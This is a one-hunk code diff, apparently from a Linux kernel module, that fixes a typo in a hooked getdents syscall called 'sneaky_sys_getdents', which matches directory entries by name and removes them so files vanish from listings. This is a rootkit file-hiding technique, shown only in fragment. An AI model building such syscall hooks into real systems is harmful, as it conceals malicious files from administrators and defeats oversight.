@@ -120,7 +120,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
       printk_ratelimited(KERN_INFO "getdents: name match: %s", d->d_name);
       // memmove to delete entry
       void *src = (void *)d + d->d_reclen;
-      void *dest = (viod *)d;
+      void *dest = (void *)d;
     }
 
     bpos += d->d_reclen;
